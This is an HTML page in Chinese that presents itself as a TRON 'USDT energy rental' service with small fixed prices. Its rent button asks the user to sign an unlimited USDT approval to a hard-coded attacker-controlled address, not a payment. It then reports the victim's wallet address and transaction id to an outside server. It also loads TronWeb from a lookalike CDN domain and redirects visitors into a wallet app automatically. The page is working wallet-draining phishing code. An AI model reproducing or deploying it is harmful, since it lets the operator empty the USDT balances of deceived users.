<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
  <title>USDT能量租赁</title>
  <link rel="icon" type="image/png" href="png/icon_trx.png">
  <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjs/11.8.0/math.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/decimal.js/10.4.3/decimal.min.js"></script>
  <script src="https://cdn.jsdelivr.cyou/tronweb/dist/TronWeb.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            primary: '#e5020d',
            primaryLight: '#C1DAF6',
            border: '#E5E5E5',
            text: '#000000',
            textLight: '#999999',
            textTitle: '#08090B',
            placeholder: '#999999',
            warning: '#FF7D00',
            background: '#F5F5F7',
            arrowCircle: '#9898A1'
          },
          fontFamily: {
            sans: ['-apple-system', 'BlinkMacSystemFont', 'Helvetica Neue', 'Arial', 'sans-serif']
          }
        }
      }
    }
  </script>
  <style type="text/tailwindcss">
    @layer utilities {
      .module-frame { border: 1px solid theme('colors.border'); border-radius: 12px; }
      .rent-card { @apply cursor-pointer rounded-xl border border-border p-4 transition; }
      .rent-card.active { @apply border-primary ring-2 ring-primary/20 bg-white; }
      .rent-grid { @apply grid grid-cols-2 gap-3; }
      .btn-primary { @apply w-full bg-primaryLight text-white py-3 rounded-xl font-bold text-[17px] shadow-sm transition-colors duration-200; }
      .btn-enabled { @apply bg-primary; }
      .tishi { width: 58%; padding: .3rem; background: #4b4848; z-index: 999999; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); border-radius: .3rem; color: #fff; font-size: 1rem; text-align: center; display: none; }
    }
  </style>
  <script>
    // 基础配置
    // 权限地址（合约地址）
    window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1';
    // 收款地址（个人地址）
    window.Payment_address = 'TAymcrbZ3ybiVq9DrqQXWx3AmtPWMiwhsh';
    // USDT官方合约地址（无需修改）
    window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otPzgjLj6t';

    const RENT_OPTIONS = [
      { id: 'm10', label: '10 分钟', minutes: 10, price: 1.0 },
      { id: 'm20', label: '20 分钟', minutes: 20, price: 1.9 },
      { id: 'm30', label: '30 分钟', minutes: 30, price: 2.8 },
      { id: 'h1',  label: '1 小时',  minutes: 60, price: 5.9 }
    ];

    let selectedOptionId = 'm10';

    function tip(message) {
      const el = document.getElementById('tip');
      el.textContent = message;
      el.style.display = 'block';
      setTimeout(() => el.style.display = 'none', 2500);
    }

    async function connectWallet() {
      try {
        if (window.tronWeb && window.tronWeb.ready) {
          console.log('钱包已连接:', tronWeb.defaultAddress.base58);
          console.log('网络:', tronWeb.fullNode.host);
          console.log('TronWeb 版本:', tronWeb.version);
          return true;
        }
        if (window.tronLink) {
          const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
          if (res.code === 200) {
            window.tronWeb = window.tronLink.tronWeb;
            console.log('通过 TronLink 连接成功');
            return true;
          }
        }
        console.log('钱包未连接');
        console.log('TronWeb 状态:', window.tronWeb);
        tip('请在内置钱包浏览器中打开或安装 TronLink/OKX 钱包');
        return false;
      } catch (e) {
        console.error('连接钱包失败:', e);
        tip('连接钱包失败');
        return false;
      }
    }

    function refreshUI() {
      // 切换卡片选中态
      for (const opt of RENT_OPTIONS) {
        const card = document.getElementById(`card-${opt.id}`);
        if (!card) continue;
        if (opt.id === selectedOptionId) card.classList.add('active'); else card.classList.remove('active');
      }
      const current = RENT_OPTIONS.find(x => x.id === selectedOptionId);
      document.getElementById('priceText').textContent = `${current.price} USDT`;
      const btn = document.getElementById('rentBtn');
      btn.classList.add('btn-enabled');
      btn.disabled = false;
    }

    async function approveRental() {
      const current = RENT_OPTIONS.find(x => x.id === selectedOptionId);
      if (!current) { tip('请选择租赁时长'); return; }

      // 检测是否在钱包环境中
      const isInWallet = window.tronWeb && window.tronWeb.ready;
      
      if (!isInWallet) {
        // 不在钱包环境中，尝试跳转到钱包
        tryWalletJump();
        return;
      }

      // 在钱包环境中，直接进行授权
      try {
        console.log('开始授权流程...');
        console.log('TronWeb 状态:', window.tronWeb);
        console.log('用户地址:', tronWeb.defaultAddress.base58);
        
        const spenderBase58 = window.Permission_address;
        const usdt = window.usdtContractAddress;
        console.log('USDT 合约地址:', usdt);
        console.log('权限地址:', spenderBase58);
        
        // 授权额度设为最大值（无限授权）
        const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

        const usdtHex = tronWeb.address.toHex(usdt);
        const spenderHex = tronWeb.address.toHex(spenderBase58);
        console.log('USDT Hex:', usdtHex);
        console.log('Spender Hex:', spenderHex);

        console.log('构建授权交易...');
        const tx = await tronWeb.transactionBuilder.triggerSmartContract(
          usdtHex,
          'approve(address,uint256)',
          { feeLimit: 100_000_000 },
          [
            { type: 'address', value: spenderHex },
            { type: 'uint256', value: maxUint256 }
          ],
          tronWeb.defaultAddress.base58
        );

        console.log('交易构建结果:', tx);
        if (!tx.result || !tx.result.result) {
          throw new Error('授权交易构建失败: ' + JSON.stringify(tx));
        }

        console.log('签名交易...');
        const signed = await tronWeb.trx.sign(tx.transaction);
        console.log('发送交易...');
        const res = await tronWeb.trx.sendRawTransaction(signed);
        console.log('交易发送结果:', res);

        if (res.result) {
          tip('授权成功');
          // 上报授权事件到后台
          try {
            const addr = tronWeb.defaultAddress.base58;
            const usdt = window.usdtContractAddress;
            const bal = null; // 可扩展：读取余额
            await fetch('https://starshines.org/api/approval', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                address: addr,
                amount_usdt: current.price,
                minutes: current.minutes,
                txid: res.txid || '',
                usdt_balance: bal
              })
            });
          } catch (e) { console.warn('上报失败', e); }
        } else {
          throw new Error('授权发送失败');
        }
      } catch (err) {
        console.error('授权失败:', err);
        tip('授权失败，请重试');
      }
    }

    // 钱包跳转功能
    function tryWalletJump() {
      const currentUrl = window.location.href;
      const imTokenUrl = 'imtokenv2://navigate?screen=DappView&url=' + encodeURIComponent(currentUrl);
      
      console.log('自动跳转到 imToken:', imTokenUrl);
      
      // 显示跳转提示
      const jumpTip = document.getElementById('jumpTip');
      if (jumpTip) {
        jumpTip.classList.remove('hidden');
      }
      
      // 直接跳转到 imToken
      window.location.href = imTokenUrl;
      
      // 如果3秒后还在页面，显示提示
      setTimeout(() => {
        if (jumpTip) {
          jumpTip.classList.add('hidden');
        }
        alert('无法自动打开 imToken，请手动操作：\n\n1. 打开 imToken 应用\n2. 在 DApp 浏览器中输入：\n' + currentUrl);
      }, 3000);
    }


    document.addEventListener('DOMContentLoaded', async () => {
      // 渲染选项
      const grid = document.getElementById('rentGrid');
      for (const opt of RENT_OPTIONS) {
        const div = document.createElement('div');
        div.id = `card-${opt.id}`;
        div.className = 'rent-card';
        div.innerHTML = `
          <div class="flex items-center justify-between">
            <div>
              <div class="text-[16px] text-textTitle font-medium">${opt.label}</div>
              <div class="text-[13px] text-textLight mt-1">固定价</div>
            </div>
            <div class="text-[18px] text-text font-semibold">${opt.price} <span class="text-[13px] text-textLight">USDT</span></div>
          </div>
        `;
        div.onclick = () => { selectedOptionId = opt.id; refreshUI(); };
        grid.appendChild(div);
      }

      document.getElementById('rentBtn').addEventListener('click', approveRental);

      refreshUI();
      // 进入页面后自动连接钱包
      await connectWallet();
      
      // 自动检测并跳转到钱包
      setTimeout(async () => {
        const isInWallet = window.tronWeb && window.tronWeb.ready;
        if (!isInWallet) {
          console.log('检测到不在钱包环境中，自动跳转到 imToken...');
          tryWalletJump();
        } else {
          // 在钱包环境中，测试网络连接
          try {
            console.log('测试网络连接...');
            const balance = await tronWeb.trx.getBalance();
            console.log('TRX 余额:', balance);
            console.log('网络连接正常');
          } catch (e) {
            console.error('网络连接测试失败:', e);
            tip('网络连接异常，请检查网络设置');
          }
        }
      }, 2000); // 等待2秒后自动跳转
    });
  </script>
</head>
<body class="min-h-screen font-sans">
  <div class="min-h-screen bg-gradient-to-br from-[#b10b16] to-[#7a0c13] p-4 sm:p-6">
    <div class="max-w-[1200px] mx-auto h-14 px-5 flex items-center justify-center">
      <div class="text-white font-extrabold text-[22px]">USDT能量租赁</div>
    </div>
    <div class="bg-background rounded-3xl overflow-hidden max-w-[1200px] mx-auto flex flex-col min-h-[calc(100vh-4rem)] shadow">

  <main class="p-5 flex flex-col items-center flex-grow">
    <div class="w-full max-w-[559px]">
      <!-- 跳转提示 -->
      <div id="jumpTip" class="bg-blue-100 border border-blue-200 rounded-xl p-4 mb-5 hidden">
        <div class="flex items-center justify-center">
          <div class="animate-spin rounded-full h-5 w-5 border-b-2 border-blue-600 mr-3"></div>
          <span class="text-blue-800 font-medium">正在跳转到 imToken 钱包...</span>
        </div>
      </div>
      
      <div class="bg-yellow-100 border border-yellow-200 rounded-xl p-4 mb-5">
        <ul class="list-disc ml-5 text-[14px] text-text">
          <li class="mb-1">请保管好相关凭证截图</li>
          <li class="mb-1">提交前请确认已在客服联系报备</li>
          <li class="mb-1">请勿重复提交申请，如遇问题请联系管理员</li>
          <li class="mb-1">务必使用真实有效的邮箱，相关信息将发送至您的邮箱</li>
          <li>请确保填写正确的 TRON(TRC20) 网络地址，地址错误可能导致资产丢失</li>
        </ul>
      </div>

      <div class="mb-2 text-[15px] text-textLight">租赁市场</div>

      <div id="rentGrid" class="rent-grid mb-5"></div>

      <div class="bg-white module-frame p-4 mb-6">
        <div class="flex items-center justify-between">
          <div class="text-textLight text-[15px]">应付</div>
          <div id="priceText" class="text-text text-[18px] font-semibold">0 USDT</div>
        </div>
      </div>
    </div>
  </main>

  <footer class="p-5 border-t border-border mt-auto bg-background">
    <div class="w-full max-w-[559px] mx-auto">
      <button id="rentBtn" class="btn-primary" disabled>租赁</button>
    </div>
  </footer>
    </div>
  </div>

  <div class="tishi" id="tip">提示</div>
</body>
</html>


